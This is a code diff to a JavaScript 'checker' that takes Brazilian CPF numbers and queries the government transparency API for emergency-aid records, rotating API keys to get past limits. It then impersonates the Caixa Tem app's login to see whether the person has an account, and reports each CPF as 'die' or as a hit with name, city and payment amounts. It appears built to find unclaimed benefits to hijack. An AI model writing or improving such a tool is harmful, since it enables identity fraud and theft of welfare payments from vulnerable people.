@@ -1,6 +1,7 @@
 const cheerio = require('cheerio');
 const { req } = require('../../../utils/checkers');
 const conf = require('../../../utils/checkers');
+const { sleep } = require('../../../utils/conf');
 const RequesT = conf.req
 const Agent = conf.useragent
 const Sleep = conf.sleep;
@@ -42,26 +43,41 @@ async function checker(test){
 	}
 
     try {
-        const key = getKey();
 
-        const req1 = await RequesT(
-            'get',
-            'http://www.transparencia.gov.br/api-de-dados/auxilio-emergencial-por-cpf-ou-nis?codigoBeneficiario=' + test + '&pagina=1',
-            {'Accept': 'application/json','chave-api-dados': key}
-        )
+        while (true) {
+            const key = getKey();
+            try {
+
+                var req1 = await RequesT(
+                    'get',
+                    'http://www.transparencia.gov.br/api-de-dados/auxilio-emergencial-por-cpf-ou-nis?codigoBeneficiario=' + test + '&pagina=1',
+                    {'Accept': 'application/json','chave-api-dados': key}
+                )
         
+                if (req1.response.data['Error API'] || req1.response.status != 200) {
+                    sleep(3)
+                    continue
+                }
+                break
+
+            } catch(err) {
+                continue
+            }
+        }
 
         if (req1.response.data.length == 0) {
     
-            return {success:false, status:'die', test: {user: test}}
+            return {success:false, status:'die', test: {user: test}, info: 'SEM BENEFICIO |'}
 
-        } else if (req1.response.data[1].situacaoAuxilioEmergencial.descriacao == 'Pagamento bloqueado ou cancelado') {
+        } else if (req1.response.data[0].enquadramentoAuxilioEmergencial.descricao == 'BOLSA FAMILIA') {
                 
-            return {success:false, status:'die', test: {user: test}}
+            return {success:false, status:'die', test: {user: test}, info: 'BOLSA FAMILIA |'}
 
-        } else if (req1.response.data[1].enquadramentoAuxilioEmergencial.descricao == 'BOLSA FAMILIA') {
+        } else if (req1.response.data[0].situacaoAuxilioEmergencial.descricao == 'Pagamento bloqueado ou cancelado') {
                 
-            return {success:false, status:'die', test: {user: test}}
+            return {success:false, status:'die', test: {user: test}, info: 'PAGAMENTO BLOQUEADO OU CANCELADO |'}
+
+            
 
         } else {
 
@@ -93,7 +109,6 @@ async function checker(test){
         }
 
     } catch(err) {
-        console.log(err)
     }
     
     while (true) {
@@ -108,9 +123,10 @@ async function checker(test){
                 'https://login2.caixa.gov.br/auth/realms/internet/protocol/openid-connect/auth?redirect_uri=br.gov.caixa.tem%3A%2Foauth2Callback&client_id=cli-mob-nbm&response_type=code&login_hint=04298408612&state=eK3J5ly669UzRJknjBm-EA&scope=offline_access&code_challenge=HlmMlnmzT9UWfpm5JxHD6CYol_T2bqTYmW5DAQeq3aw&code_challenge_method=S256&deviceId='+ deviceId +'&so=Android&app=br.gov.caixa.tem%3Bvertical%3Dhttps%3A%2F%2Fmobilidade.cloud.caixa.gov.br%3Bruntime%3Dmfp&origem=mf&nivel=10', 
                 {'User-Agent': UserAgent}
             );
+
             if(req2.success = true) {
                 if (req2.response.status !== 200) {
-                    Sleep(0.33)
+                    Sleep(1)
                     continue
                 }
             } else {
@@ -139,17 +155,15 @@ async function checker(test){
                             'f10=&fingerprint=8c1621f80e9eb066d24ebff9e9238a1c&step=1&situacaoGeolocalizacao=&latitude=&longitude=&username='+test
                         )
 
-                        if(req2.success = true){
+                        if(req3.success = true){
                             if (req2.response.status !== 200) {
-                                Sleep(0.33)
+                                Sleep(0.85)
                                 continue
                             }
-                        } else {
-                            continue
                         }
                         
                         if (req3.response.data.includes('o existe cadastro para o CPF informado.')) {
-                            var _results = ' | nome: ' + results.name + ' | cidade: ' + results.cidade + ' | UF: ' + results.estado
+                            var _results = 'nome: ' + results.name + ' | cidade: ' + results.cidade + ' | UF: ' + results.estado
                             _results += ' | tipo de conta: ' + results.enquadramentoAuxilioEmergencial
                             _results +=  ' |mês disponibilização: ' + results.mesDisp
                             _results += ' | numero de parcelas: ' + results.numParcelas + ' | valor total: R$' + results.valorTotal
